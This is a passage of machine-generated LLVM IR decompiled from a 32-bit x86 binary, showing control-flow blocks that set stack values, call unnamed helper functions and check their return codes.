  %v1_804f07f = add i32 %v0_804f07f, -4
  %v2_804f07f = inttoptr i32 %v1_804f07f to i32*
  store i32 16384, i32* %v2_804f07f, align 4
  %v1_804f084 = add i32 %v0_804f07f, 1880
  %v2_804f084 = inttoptr i32 %v1_804f084 to i32*
  %v3_804f084 = load i32, i32* %v2_804f084, align 4
  store i32 %v3_804f084, i32* %edx.global-to-local, align 4
  %v2_804f08b = add i32 %v0_804f07f, -8
  %v3_804f08b = inttoptr i32 %v2_804f08b to i32*
  store i32 %v3_804f084, i32* %v3_804f08b, align 4
  %v2_804f08c = add i32 %v0_804f07f, -12
  %v3_804f08c = inttoptr i32 %v2_804f08c to i32*
  store i32 %v0_804f07a, i32* %v3_804f08c, align 4
  %v0_804f08d = load i32, i32* @edi, align 4
  %v1_804f08d = add i32 %v0_804f08d, 4
  %v2_804f08d = inttoptr i32 %v1_804f08d to i32*
  %v3_804f08d = load i32, i32* %v2_804f08d, align 4
  store i32 %v3_804f08d, i32* %eax.global-to-local, align 4
  %v2_804f090 = add i32 %v0_804f07f, -16
  %v3_804f090 = inttoptr i32 %v2_804f090 to i32*
  store i32 %v3_804f08d, i32* %v3_804f090, align 4
  %v0_804f091 = call i32 @function_8050966()
  store i32 %v0_804f091, i32* %eax.global-to-local, align 4
  %v0_804f096 = load i32, i32* @esp, align 4
  %v1_804f099 = add i32 %v0_804f096, 28
  %v2_804f099 = inttoptr i32 %v1_804f099 to i32*
  store i32 16384, i32* %v2_804f099, align 4
  %v1_804f09e = add i32 %v0_804f096, 24
  %v2_804f09e = inttoptr i32 %v1_804f09e to i32*
  store i32 2, i32* %v2_804f09e, align 4
  %v1_804f0a0 = add i32 %v0_804f096, 20
  %v2_804f0a0 = inttoptr i32 %v1_804f0a0 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052b8a.25 to i32), i32* %v2_804f0a0, align 4
  %v0_804f0a5 = load i32, i32* @edi, align 4
  %v1_804f0a5 = add i32 %v0_804f0a5, 4
  %v2_804f0a5 = inttoptr i32 %v1_804f0a5 to i32*
  %v3_804f0a5 = load i32, i32* %v2_804f0a5, align 4
  %v2_804f0a8 = add i32 %v0_804f096, 16
  %v3_804f0a8 = inttoptr i32 %v2_804f0a8 to i32*
  store i32 %v3_804f0a5, i32* %v3_804f0a8, align 4
  %v0_804f0a9 = call i32 @function_8050966()
  store i32 %v0_804f0a9, i32* %eax.global-to-local, align 4
  %v0_804f0ae = load i32, i32* @esp, align 4
  %v1_804f0ae = inttoptr i32 %v0_804f0ae to i32*
  store i32 5, i32* %v1_804f0ae, align 4
  %v0_804f0b5 = call i32 @function_804f6c0()
  store i32 %v0_804f0b5, i32* %eax.global-to-local, align 4
  %v0_804f0bd = load i32, i32* @edi, align 4
  %v1_804f0bd = add i32 %v0_804f0bd, 12
  %v2_804f0bd = inttoptr i32 %v1_804f0bd to i32*
  store i32 6, i32* %v2_804f0bd, align 4
  br label %dec_label_pc_804ed51

dec_label_pc_804f0c9:                             ; preds = %dec_label_pc_804eb4c, %dec_label_pc_804eb4c, %dec_label_pc_804eb4c, %dec_label_pc_804eb4c
  %v1_804f0c9 = add i32 %v0_804f0c9, 1
  store i32 %v1_804f0c9, i32* %eax.global-to-local, align 4
  %v1_804f0ca = load i32, i32* @esp, align 4
  %v2_804f0ca = add i32 %v1_804f0ca, 32
  %v3_804f0ca = inttoptr i32 %v2_804f0ca to i32*
  store i32 %v1_804f0c9, i32* %v3_804f0ca, align 4
  %v0_804f0ce = load i32, i32* %eax.global-to-local, align 4
  %v1_804f0ce = add i32 %v0_804f0ce, 1
  %v8_804f0ce = icmp eq i32 %v1_804f0ce, 0
  store i32 %v1_804f0ce, i32* %eax.global-to-local, align 4
  %v1_804f0cf = icmp eq i1 %v8_804f0ce, false
  br i1 %v1_804f0cf, label %dec_label_pc_804f33f, label %dec_label_pc_804f0d5

dec_label_pc_804f0d5:                             ; preds = %dec_label_pc_804eb74, %dec_label_pc_804f0c9, %dec_label_pc_804eb40
  %v0_804f0d5 = load i32, i32* @esp, align 4
  %v1_804f0d8 = add i32 %v0_804f0d5, -16
  %v2_804f0d8 = inttoptr i32 %v1_804f0d8 to i32*
  store i32 25, i32* %v2_804f0d8, align 4
  %v0_804f0da = call i32 @function_804f740()
  store i32 %v0_804f0da, i32* %eax.global-to-local, align 4
  %v0_804f0df = load i32, i32* @esp, align 4
  %v1_804f0df = inttoptr i32 %v0_804f0df to i32*
  %v2_804f0df = load i32, i32* %v1_804f0df, align 4
  store i32 %v2_804f0df, i32* %eax.global-to-local, align 4
  %v3_804f0df = add i32 %v0_804f0df, 4
  %v1_804f0e0 = inttoptr i32 %v3_804f0df to i32*
  %v1_804f0e1 = add i32 %v0_804f0df, 1880
  store i32 %v1_804f0e1, i32* %edx.global-to-local, align 4
  store i32 %v1_804f0e1, i32* %v1_804f0e0, align 4
  store i32 25, i32* %v1_804f0df, align 4
  %v0_804f0eb = call i32 @function_804f690()
  store i32 %v0_804f0eb, i32* %eax.global-to-local, align 4
  %v0_804f0f0 = load i32, i32* @esp, align 4
  %v1_804f0f0 = add i32 %v0_804f0f0, 1880
  %v2_804f0f0 = inttoptr i32 %v1_804f0f0 to i32*
  %v3_804f0f0 = load i32, i32* %v2_804f0f0, align 4
  %v1_804f0f7 = add i32 %v3_804f0f0, -1
  store i32 %v1_804f0f7, i32* %edx.global-to-local, align 4
  %v2_804f0f8 = add i32 %v0_804f0f0, -4
  %v3_804f0f8 = inttoptr i32 %v2_804f0f8 to i32*
  store i32 %v1_804f0f7, i32* %v3_804f0f8, align 4
  %v2_804f0f9 = add i32 %v0_804f0f0, -8
  %v3_804f0f9 = inttoptr i32 %v2_804f0f9 to i32*
  store i32 %v0_804f0eb, i32* %v3_804f0f9, align 4
  %v0_804f0fa = load i32, i32* @edi, align 4
  %v1_804f0fa = add i32 %v0_804f0fa, 24
  %v2_804f0fa = inttoptr i32 %v1_804f0fa to i32*
  %v3_804f0fa = load i32, i32* %v2_804f0fa, align 4
  store i32 %v3_804f0fa, i32* %eax.global-to-local, align 4
  %v2_804f0fd = add i32 %v0_804f0f0, -12
  %v3_804f0fd = inttoptr i32 %v2_804f0fd to i32*
  store i32 %v3_804f0fa, i32* %v3_804f0fd, align 4
  %v1_804f0fe = add i32 %v0_804f0f0, 32
  %v2_804f0fe = inttoptr i32 %v1_804f0fe to i32*
  %v3_804f0fe = load i32, i32* %v2_804f0fe, align 4
  store i32 %v3_804f0fe, i32* %eax.global-to-local, align 4
  %v2_804f102 = add i32 %v0_804f0f0, -16
  %v3_804f102 = inttoptr i32 %v2_804f102 to i32*
  store i32 %v3_804f0fe, i32* %v3_804f102, align 4
  %v0_804f103 = call i32 @function_804fdc0()
  %v0_804f108 = load i32, i32* @esp, align 4
  %v8_804f10b = icmp eq i32 %v0_804f103, -1
  %v1_804f10c = icmp eq i1 %v8_804f10b, false
  %v2_804f10c = zext i1 %v1_804f10c to i32
  %v2_804f10f = icmp eq i1 %v1_804f10c, false
  store i32 %v2_804f10c, i32* %eax.global-to-local, align 4
  %v2_804f114 = add i32 %v0_804f108, 64
  %v3_804f114 = inttoptr i32 %v2_804f114 to i32*
  store i32 %v2_804f10c, i32* %v3_804f114, align 4
  %v0_804e9bf = load i32, i32* @esp, align 4
  %v1_804e9c2 = add i32 %v0_804e9bf, -16
  %v2_804e9c2 = inttoptr i32 %v1_804e9c2 to i32*
  store i32 25, i32* %v2_804e9c2, align 4
  %v0_804e9c4 = call i32 @function_804f6c0()
  store i32 %v0_804e9c4, i32* %eax.global-to-local, align 4
  %v0_804e9c9 = load i32, i32* @esp, align 4
  br i1 %v2_804f10f, label %dec_label_pc_804e9cc.backedge, label %dec_label_pc_804f120

dec_label_pc_804f120:                             ; preds = %dec_label_pc_804f0d5
  %v1_804f12d = add i32 %v0_804e9c9, 48
  %v2_804f12d = inttoptr i32 %v1_804f12d to i32*
  %v3_804f12d = load i32, i32* %v2_804f12d, align 4
  %v13_804f12d = icmp eq i32 %v3_804f12d, -1
  br i1 %v13_804f12d, label %dec_label_pc_804e9cc.backedge, label %dec_label_pc_804f138

dec_label_pc_804f138:                             ; preds = %dec_label_pc_804f120, %dec_label_pc_804f33f
  %v0_804f148.in = phi i32 [ %v0_804e9c9, %dec_label_pc_804f120 ], [ %v0_804f349, %dec_label_pc_804f33f ]
  %v0_804f148 = add i32 %v0_804f148.in, 16
  %v1_804f138 = add i32 %v0_804f148.in, 48
  %v2_804f138 = inttoptr i32 %v1_804f138 to i32*
  %v3_804f138 = load i32, i32* %v2_804f138, align 4
  store i32 %v3_804f138, i32* %eax.global-to-local, align 4
  %tmp121 = icmp slt i32 %v3_804f138, 1
  br i1 %tmp121, label %dec_label_pc_804f038, label %dec_label_pc_804f144

dec_label_pc_804f144:                             ; preds = %dec_label_pc_804f138
  %v0_804f144 = load i32, i32* @edi, align 4
  %v1_804f144 = inttoptr i32 %v0_804f144 to i32*
  %v2_804f144 = load i32, i32* %v1_804f144, align 4
  store i32 %v2_804f144, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804f148 = add i32 %v0_804f148.in, 12
  %v2_804f148 = inttoptr i32 %v1_804f148 to i32*
  store i32 16384, i32* %v2_804f148, align 4
  %v0_804f14d = load i32, i32* %edx.global-to-local, align 4
  %v1_804f14d = add i32 %v0_804f14d, 13
  %v2_804f14d = inttoptr i32 %v1_804f14d to i8*
  %v3_804f14d = load i8, i8* %v2_804f14d, align 1
  %v4_804f14d = zext i8 %v3_804f14d to i32
  %v5_804f14d = load i32, i32* %eax.global-to-local, align 4
  %v6_804f14d = and i32 %v5_804f14d, -256
  %v7_804f14d = or i32 %v6_804f14d, %v4_804f14d
  store i32 %v7_804f14d, i32* %eax.global-to-local, align 4
  %v2_804f150 = add i32 %v0_804f148.in, 8
  %v3_804f150 = inttoptr i32 %v2_804f150 to i32*
  store i32 %v7_804f14d, i32* %v3_804f150, align 4
  %v0_804f151 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f151 = add i32 %v0_804f151, 4
  %v2_804f151 = inttoptr i32 %v1_804f151 to i32*
  %v3_804f151 = load i32, i32* %v2_804f151, align 4
  store i32 %v3_804f151, i32* %eax.global-to-local, align 4
  %v2_804f154 = add i32 %v0_804f148.in, 4
  %v3_804f154 = inttoptr i32 %v2_804f154 to i32*
  store i32 %v3_804f151, i32* %v3_804f154, align 4
  %v0_804f155 = load i32, i32* @edi, align 4
  %v1_804f155 = add i32 %v0_804f155, 4
  %v2_804f155 = inttoptr i32 %v1_804f155 to i32*
  %v3_804f155 = load i32, i32* %v2_804f155, align 4
  store i32 %v3_804f155, i32* %eax.global-to-local, align 4
  %v3_804f158 = inttoptr i32 %v0_804f148.in to i32*
  store i32 %v3_804f155, i32* %v3_804f158, align 4
  %v0_804f159 = call i32 @function_8050966()
  store i32 %v0_804f159, i32* %eax.global-to-local, align 4
  %v0_804f15e = load i32, i32* @esp, align 4
  %v1_804f15e = add i32 %v0_804f15e, -4
  %v2_804f15e = inttoptr i32 %v1_804f15e to i32*
  store i32 16384, i32* %v2_804f15e, align 4
  %v1_804f163 = add i32 %v0_804f15e, -8
  %v2_804f163 = inttoptr i32 %v1_804f163 to i32*
  store i32 2, i32* %v2_804f163, align 4
  %v1_804f165 = add i32 %v0_804f15e, -12
  %v2_804f165 = inttoptr i32 %v1_804f165 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052b8a.25 to i32), i32* %v2_804f165, align 4
  %v0_804f16a = load i32, i32* @edi, align 4
  %v1_804f16a = add i32 %v0_804f16a, 4
  %v2_804f16a = inttoptr i32 %v1_804f16a to i32*
  %v3_804f16a = load i32, i32* %v2_804f16a, align 4
  %v2_804f16d = add i32 %v0_804f15e, -16
  %v3_804f16d = inttoptr i32 %v2_804f16d to i32*
  store i32 %v3_804f16a, i32* %v3_804f16d, align 4
  %v0_804f16e = call i32 @function_8050966()
  store i32 %v0_804f16e, i32* %eax.global-to-local, align 4
  %v0_804f176 = load i32, i32* @edi, align 4
  %v1_804f176 = add i32 %v0_804f176, 12
  %v2_804f176 = inttoptr i32 %v1_804f176 to i32*
  store i32 5, i32* %v2_804f176, align 4
  br label %dec_label_pc_804ed51

dec_label_pc_804f182:                             ; preds = %dec_label_pc_804ebd1, %dec_label_pc_804ebd1, %dec_label_pc_804ebd1, %dec_label_pc_804ebd1, %dec_label_pc_804ebd1
  %v1_804f182 = add i32 %v0_804f182, 1
  store i32 %v1_804f182, i32* %eax.global-to-local, align 4
  %v1_804f183 = load i32, i32* @esp, align 4
  %v2_804f183 = add i32 %v1_804f183, 32
  %v3_804f183 = inttoptr i32 %v2_804f183 to i32*
  store i32 %v1_804f182, i32* %v3_804f183, align 4
  %v0_804f187 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f187 = add i32 %v0_804f187, 1
  %v8_804f187 = icmp eq i32 %v1_804f187, 0
  store i32 %v1_804f187, i32* %eax.global-to-local, align 4
  br i1 %v8_804f187, label %dec_label_pc_804e9cc.backedge, label %dec_label_pc_804f18e

dec_label_pc_804f18e:                             ; preds = %dec_label_pc_804f182
  %v0_804f18e = load i32, i32* @esp, align 4
  %v1_804f18e = add i32 %v0_804f18e, 32
  %v2_804f18e = inttoptr i32 %v1_804f18e to i32*
  %v3_804f18e = load i32, i32* %v2_804f18e, align 4
  store i32 %v3_804f18e, i32* @esi, align 4
  %tmp122 = icmp slt i32 %v3_804f18e, 1
  br i1 %tmp122, label %dec_label_pc_804f038, label %dec_label_pc_804f19a

dec_label_pc_804f19a:                             ; preds = %dec_label_pc_804f18e
  %v1_804f19d = add i32 %v0_804f18e, -16
  %v2_804f19d = inttoptr i32 %v1_804f19d to i32*
  store i32 7, i32* %v2_804f19d, align 4
  %v0_804f19f = call i32 @function_804f740()
  store i32 %v0_804f19f, i32* %eax.global-to-local, align 4
  %v0_804f1a4 = load i32, i32* @esp, align 4
  %v1_804f1a4 = inttoptr i32 %v0_804f1a4 to i32*
  %v2_804f1a4 = load i32, i32* %v1_804f1a4, align 4
  store i32 %v2_804f1a4, i32* %ecx.global-to-local, align 4
  %v3_804f1a4 = add i32 %v0_804f1a4, 4
  %v1_804f1a5 = inttoptr i32 %v3_804f1a4 to i32*
  %v2_804f1a5 = load i32, i32* %v1_804f1a5, align 4
  store i32 %v2_804f1a5, i32* @ebx, align 4
  %v1_804f1a6 = add i32 %v0_804f1a4, 1880
  store i32 %v1_804f1a6, i32* %eax.global-to-local, align 4
  store i32 %v1_804f1a6, i32* %v1_804f1a5, align 4
  store i32 7, i32* %v1_804f1a4, align 4
  %v0_804f1b0 = call i32 @function_804f690()
  store i32 %v0_804f1b0, i32* %eax.global-to-local, align 4
  %v0_804f1b5 = load i32, i32* @esp, align 4
  %v1_804f1b5 = add i32 %v0_804f1b5, -4
  %v2_804f1b5 = inttoptr i32 %v1_804f1b5 to i32*
  store i32 16384, i32* %v2_804f1b5, align 4
  %v1_804f1ba = add i32 %v0_804f1b5, 1880
  %v2_804f1ba = inttoptr i32 %v1_804f1ba to i32*
  %v3_804f1ba = load i32, i32* %v2_804f1ba, align 4
  store i32 %v3_804f1ba, i32* %edx.global-to-local, align 4
  %v2_804f1c1 = add i32 %v0_804f1b5, -8
  %v3_804f1c1 = inttoptr i32 %v2_804f1c1 to i32*
  store i32 %v3_804f1ba, i32* %v3_804f1c1, align 4
  %v2_804f1c2 = add i32 %v0_804f1b5, -12
  %v3_804f1c2 = inttoptr i32 %v2_804f1c2 to i32*
  store i32 %v0_804f1b0, i32* %v3_804f1c2, align 4
  %v0_804f1c3 = load i32, i32* @edi, align 4
  %v1_804f1c3 = add i32 %v0_804f1c3, 4
  %v2_804f1c3 = inttoptr i32 %v1_804f1c3 to i32*
  %v3_804f1c3 = load i32, i32* %v2_804f1c3, align 4
  store i32 %v3_804f1c3, i32* %eax.global-to-local, align 4
  %v2_804f1c6 = add i32 %v0_804f1b5, -16
  %v3_804f1c6 = inttoptr i32 %v2_804f1c6 to i32*
  store i32 %v3_804f1c3, i32* %v3_804f1c6, align 4
  %v0_804f1c7 = call i32 @function_8050966()
  store i32 %v0_804f1c7, i32* %eax.global-to-local, align 4
  %v0_804f1cc = load i32, i32* @esp, align 4
  %v1_804f1cf = add i32 %v0_804f1cc, 28
  %v2_804f1cf = inttoptr i32 %v1_804f1cf to i32*
  store i32 16384, i32* %v2_804f1cf, align 4
  %v1_804f1d4 = add i32 %v0_804f1cc, 24
  %v2_804f1d4 = inttoptr i32 %v1_804f1d4 to i32*
  store i32 2, i32* %v2_804f1d4, align 4
  %v1_804f1d6 = add i32 %v0_804f1cc, 20
  %v2_804f1d6 = inttoptr i32 %v1_804f1d6 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052b8a.25 to i32), i32* %v2_804f1d6, align 4
  %v0_804f1db = load i32, i32* @edi, align 4
  %v1_804f1db = add i32 %v0_804f1db, 4
  %v2_804f1db = inttoptr i32 %v1_804f1db to i32*
  %v3_804f1db = load i32, i32* %v2_804f1db, align 4
  store i32 %v3_804f1db, i32* %eax.global-to-local, align 4
  %v2_804f1de = add i32 %v0_804f1cc, 16
  %v3_804f1de = inttoptr i32 %v2_804f1de to i32*
  store i32 %v3_804f1db, i32* %v3_804f1de, align 4
  %v0_804f1df = call i32 @function_8050966()
  store i32 %v0_804f1df, i32* %eax.global-to-local, align 4
  %v0_804f1e4 = load i32, i32* @esp, align 4
  %v1_804f1e4 = inttoptr i32 %v0_804f1e4 to i32*
  store i32 7, i32* %v1_804f1e4, align 4
  %v0_804f1eb = call i32 @function_804f6c0()
  store i32 %v0_804f1eb, i32* %eax.global-to-local, align 4
  %v0_804f1f3 = load i32, i32* @edi, align 4
  %v1_804f1f3 = add i32 %v0_804f1f3, 12
  %v2_804f1f3 = inttoptr i32 %v1_804f1f3 to i32*
  store i32 9, i32* %v2_804f1f3, align 4
  br label %dec_label_pc_804ed51

dec_label_pc_804f1ff:                             ; preds = %dec_label_pc_804eb07, %dec_label_pc_804eb07, %dec_label_pc_804eb07, %dec_label_pc_804eb07, %dec_label_pc_804eb07
  %v1_804f1ff = add i32 %v0_804f1ff, 1
  store i32 %v1_804f1ff, i32* %eax.global-to-local, align 4
  %v1_804f200 = load i32, i32* @esp, align 4
  %v2_804f200 = add i32 %v1_804f200, 32
  %v3_804f200 = inttoptr i32 %v2_804f200 to i32*
  store i32 %v1_804f1ff, i32* %v3_804f200, align 4
  %v0_804f204 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f204 = add i32 %v0_804f204, 1
  %v8_804f204 = icmp eq i32 %v1_804f204, 0
  store i32 %v1_804f204, i32* %eax.global-to-local, align 4
  %v1_804f205 = icmp eq i1 %v8_804f204, false
  br i1 %v1_804f205, label %dec_label_pc_804f310, label %dec_label_pc_804f20b

dec_label_pc_804f20b:                             ; preds = %dec_label_pc_804eb38, %dec_label_pc_804f1ff, %dec_label_pc_804eafb
  %v0_804f20b = load i32, i32* @esp, align 4
  %v1_804f20e = add i32 %v0_804f20b, -16
  %v2_804f20e = inttoptr i32 %v1_804f20e to i32*
  store i32 26, i32* %v2_804f20e, align 4
  %v0_804f210 = call i32 @function_804f740()
  store i32 %v0_804f210, i32* %eax.global-to-local, align 4
  %v0_804f215 = load i32, i32* @esp, align 4
  %v1_804f215 = inttoptr i32 %v0_804f215 to i32*
  store i32 27, i32* %v1_804f215, align 4
  %v0_804f21c = call i32 @function_804f740()
  store i32 %v0_804f21c, i32* %eax.global-to-local, align 4
  %v0_804f221 = load i32, i32* @esp, align 4
  %v1_804f221 = inttoptr i32 %v0_804f221 to i32*
  %v2_804f221 = load i32, i32* %v1_804f221, align 4
  store i32 %v2_804f221, i32* %ecx.global-to-local, align 4
  %v3_804f221 = add i32 %v0_804f221, 4
  %v1_804f222 = inttoptr i32 %v3_804f221 to i32*
  %v2_804f222 = load i32, i32* %v1_804f222, align 4
  store i32 %v2_804f222, i32* %ebx.global-to-local, align 4
  %v1_804f223 = add i32 %v0_804f221, 1880
  store i32 %v1_804f223, i32* %ecx.global-to-local, align 4
  store i32 %v1_804f223, i32* %v1_804f222, align 4
  store i32 26, i32* %v1_804f221, align 4
  %v0_804f22d = call i32 @function_804f690()
  store i32 %v0_804f22d, i32* %eax.global-to-local, align 4
  store i32 %v0_804f22d, i32* @ebx, align 4
  %v0_804f234 = load i32, i32* @esp, align 4
  %v1_804f234 = inttoptr i32 %v0_804f234 to i32*
  %v2_804f234 = load i32, i32* %v1_804f234, align 4
  store i32 %v2_804f234, i32* %eax.global-to-local, align 4
  %v3_804f234 = add i32 %v0_804f234, 4
  %v1_804f235 = inttoptr i32 %v3_804f234 to i32*
  %v2_804f235 = load i32, i32* %v1_804f235, align 4
  store i32 %v2_804f235, i32* %edx.global-to-local, align 4
  %v1_804f236 = add i32 %v0_804f234, 1880
  store i32 %v1_804f236, i32* %eax.global-to-local, align 4
  store i32 %v1_804f236, i32* %v1_804f235, align 4
  store i32 27, i32* %v1_804f234, align 4
  %v0_804f240 = call i32 @function_804f690()
  store i32 %v0_804f240, i32* %eax.global-to-local, align 4
  store i32 %v0_804f240, i32* @esi, align 4
  %v0_804f247 = load i32, i32* @esp, align 4
  %v1_804f247 = add i32 %v0_804f247, 1880
  %v2_804f247 = inttoptr i32 %v1_804f247 to i32*
  %v3_804f247 = load i32, i32* %v2_804f247, align 4
  %v1_804f24e = add i32 %v3_804f247, -1
  store i32 %v1_804f24e, i32* %eax.global-to-local, align 4
  %v2_804f24f = add i32 %v0_804f247, -4
  %v3_804f24f = inttoptr i32 %v2_804f24f to i32*
  store i32 %v1_804f24e, i32* %v3_804f24f, align 4
  %v0_804f250 = load i32, i32* @ebx, align 4
  %v2_804f250 = add i32 %v0_804f247, -8
  %v3_804f250 = inttoptr i32 %v2_804f250 to i32*
  store i32 %v0_804f250, i32* %v3_804f250, align 4
  %v0_804f251 = load i32, i32* @edi, align 4
  %v1_804f251 = add i32 %v0_804f251, 24
  %v2_804f251 = inttoptr i32 %v1_804f251 to i32*
  %v3_804f251 = load i32, i32* %v2_804f251, align 4
  store i32 %v3_804f251, i32* %eax.global-to-local, align 4
  %v2_804f254 = add i32 %v0_804f247, -12
  %v3_804f254 = inttoptr i32 %v2_804f254 to i32*
  store i32 %v3_804f251, i32* %v3_804f254, align 4
  %v1_804f255 = add i32 %v0_804f247, 32
  %v2_804f255 = inttoptr i32 %v1_804f255 to i32*
  %v3_804f255 = load i32, i32* %v2_804f255, align 4
  store i32 %v3_804f255, i32* %eax.global-to-local, align 4
  %v2_804f259 = add i32 %v0_804f247, -16
  %v3_804f259 = inttoptr i32 %v2_804f259 to i32*
  store i32 %v3_804f255, i32* %v3_804f259, align 4
  %v0_804f25a = call i32 @function_804fdc0()
  %v0_804f25f = load i32, i32* @esp, align 4
  %v8_804f262 = icmp eq i32 %v0_804f25a, -1
  %v1_804f263 = icmp eq i1 %v8_804f262, false
  %v2_804f263 = zext i1 %v1_804f263 to i32
  %v2_804f266 = icmp eq i1 %v1_804f263, false
  store i32 %v2_804f263, i32* %eax.global-to-local, align 4
  %v2_804f26b = add i32 %v0_804f25f, 64
  %v3_804f26b = inttoptr i32 %v2_804f26b to i32*
  store i32 %v2_804f263, i32* %v3_804f26b, align 4
  %v1_804f271 = icmp eq i1 %v2_804f266, false
  br i1 %v1_804f271, label %dec_label_pc_804f2a3, label %dec_label_pc_804f273

dec_label_pc_804f273:                             ; preds = %dec_label_pc_804f20b
  %v0_804f273 = load i32, i32* @esp, align 4
  %v1_804f273 = add i32 %v0_804f273, 1864
  %v2_804f273 = inttoptr i32 %v1_804f273 to i32*
  %v3_804f273 = load i32, i32* %v2_804f273, align 4
  %v1_804f27a = add i32 %v3_804f273, -1
  store i32 %v1_804f27a, i32* %eax.global-to-local, align 4
  %v2_804f27b = add i32 %v0_804f273, -4
  %v3_804f27b = inttoptr i32 %v2_804f27b to i32*
  store i32 %v1_804f27a, i32* %v3_804f27b, align 4
  %v0_804f27c = load i32, i32* @esi, align 4
  %v2_804f27c = add i32 %v0_804f273, -8
  %v3_804f27c = inttoptr i32 %v2_804f27c to i32*
  store i32 %v0_804f27c, i32* %v3_804f27c, align 4
  %v0_804f27d = load i32, i32* @edi, align 4
  %v1_804f27d = add i32 %v0_804f27d, 24
  %v2_804f27d = inttoptr i32 %v1_804f27d to i32*
  %v3_804f27d = load i32, i32* %v2_804f27d, align 4
  store i32 %v3_804f27d, i32* %eax.global-to-local, align 4
  %v2_804f280 = add i32 %v0_804f273, -12
  %v3_804f280 = inttoptr i32 %v2_804f280 to i32*
  store i32 %v3_804f27d, i32* %v3_804f280, align 4
  %v1_804f281 = add i32 %v0_804f273, 16
  %v2_804f281 = inttoptr i32 %v1_804f281 to i32*
  %v3_804f281 = load i32, i32* %v2_804f281, align 4
  store i32 %v3_804f281, i32* %eax.global-to-local, align 4
  %v2_804f285 = add i32 %v0_804f273, -16
  %v3_804f285 = inttoptr i32 %v2_804f285 to i32*
  store i32 %v3_804f281, i32* %v3_804f285, align 4
  %v0_804f286 = call i32 @function_804fdc0()
  %v0_804f28b = load i32, i32* @esp, align 4
  %v8_804f28e = icmp eq i32 %v0_804f286, -1
  %v1_804f28f = icmp eq i1 %v8_804f28e, false
  %v2_804f28f = zext i1 %v1_804f28f to i32
  %v2_804f292 = icmp eq i1 %v1_804f28f, false
  store i32 %v2_804f28f, i32* %eax.global-to-local, align 4
  %v2_804f297 = add i32 %v0_804f28b, 48
  %v3_804f297 = inttoptr i32 %v2_804f297 to i32*
  store i32 %v2_804f28f, i32* %v3_804f297, align 4
  br i1 %v2_804f292, label %dec_label_pc_804f44b, label %dec_label_pc_804f2a3

dec_label_pc_804f2a3:                             ; preds = %dec_label_pc_804f273, %dec_label_pc_804f20b
  %v0_804f2a3 = load i32, i32* @esp, align 4
  %v1_804f2a6 = add i32 %v0_804f2a3, -16
  %v2_804f2a6 = inttoptr i32 %v1_804f2a6 to i32*
  store i32 26, i32* %v2_804f2a6, align 4
  %v0_804f2a8 = call i32 @function_804f6c0()
  store i32 %v0_804f2a8, i32* %eax.global-to-local, align 4
  %v0_804f2ad = load i32, i32* @esp, align 4
  %v1_804f2ad = inttoptr i32 %v0_804f2ad to i32*
  store i32 27, i32* %v1_804f2ad, align 4
  %v0_804f2b4 = call i32 @function_804f6c0()
  store i32 %v0_804f2b4, i32* %eax.global-to-local, align 4
  %v0_804f2b9 = load i32, i32* @esp, align 4
  %v1_804f2bc = add i32 %v0_804f2b9, 48
  %v2_804f2bc = inttoptr i32 %v1_804f2bc to i32*
  %v3_804f2bc = load i32, i32* %v2_804f2bc, align 4
  %v13_804f2bc = icmp eq i32 %v3_804f2bc, -1
  br i1 %v13_804f2bc, label %dec_label_pc_804e9cc.backedge, label %dec_label_pc_804f2c7

dec_label_pc_804f2c7:                             ; preds = %dec_label_pc_804f2a3, %dec_label_pc_804f310
  %v0_804f2d7.in = phi i32 [ %v0_804f2b9, %dec_label_pc_804f2a3 ], [ %v0_804f326, %dec_label_pc_804f310 ]
  %v0_804f2d7 = add i32 %v0_804f2d7.in, 16
  %v1_804f2c7 = add i32 %v0_804f2d7.in, 48
  %v2_804f2c7 = inttoptr i32 %v1_804f2c7 to i32*
  %v3_804f2c7 = load i32, i32* %v2_804f2c7, align 4
  %tmp123 = icmp slt i32 %v3_804f2c7, 1
  br i1 %tmp123, label %dec_label_pc_804f038, label %dec_label_pc_804f2d3

dec_label_pc_804f2d3:                             ; preds = %dec_label_pc_804f2c7
  %v0_804f2d3 = load i32, i32* @edi, align 4
  %v1_804f2d3 = inttoptr i32 %v0_804f2d3 to i32*
  %v2_804f2d3 = load i32, i32* %v1_804f2d3, align 4
  store i32 %v2_804f2d3, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804f2d7 = add i32 %v0_804f2d7.in, 12
  %v2_804f2d7 = inttoptr i32 %v1_804f2d7 to i32*
  store i32 16384, i32* %v2_804f2d7, align 4
  %v0_804f2dc = load i32, i32* %edx.global-to-local, align 4
  %v1_804f2dc = add i32 %v0_804f2dc, 12
  %v2_804f2dc = inttoptr i32 %v1_804f2dc to i8*
  %v3_804f2dc = load i8, i8* %v2_804f2dc, align 1
  %v4_804f2dc = zext i8 %v3_804f2dc to i32
  %v5_804f2dc = load i32, i32* %eax.global-to-local, align 4
  %v6_804f2dc = and i32 %v5_804f2dc, -256
  %v7_804f2dc = or i32 %v6_804f2dc, %v4_804f2dc
  store i32 %v7_804f2dc, i32* %eax.global-to-local, align 4
  %v2_804f2df = add i32 %v0_804f2d7.in, 8
  %v3_804f2df = inttoptr i32 %v2_804f2df to i32*
  store i32 %v7_804f2dc, i32* %v3_804f2df, align 4
  %v0_804f2e0 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f2e0 = inttoptr i32 %v0_804f2e0 to i32*
  %v2_804f2e0 = load i32, i32* %v1_804f2e0, align 4
  store i32 %v2_804f2e0, i32* @esi, align 4
  %v2_804f2e2 = add i32 %v0_804f2d7.in, 4
  %v3_804f2e2 = inttoptr i32 %v2_804f2e2 to i32*
  store i32 %v2_804f2e0, i32* %v3_804f2e2, align 4
  %v0_804f2e3 = load i32, i32* @edi, align 4
  %v1_804f2e3 = add i32 %v0_804f2e3, 4
  %v2_804f2e3 = inttoptr i32 %v1_804f2e3 to i32*
  %v3_804f2e3 = load i32, i32* %v2_804f2e3, align 4
  store i32 %v3_804f2e3, i32* @ebx, align 4
  %v3_804f2e6 = inttoptr i32 %v0_804f2d7.in to i32*
  store i32 %v3_804f2e3, i32* %v3_804f2e6, align 4
  %v0_804f2e7 = call i32 @function_8050966()
  store i32 %v0_804f2e7, i32* %eax.global-to-local, align 4
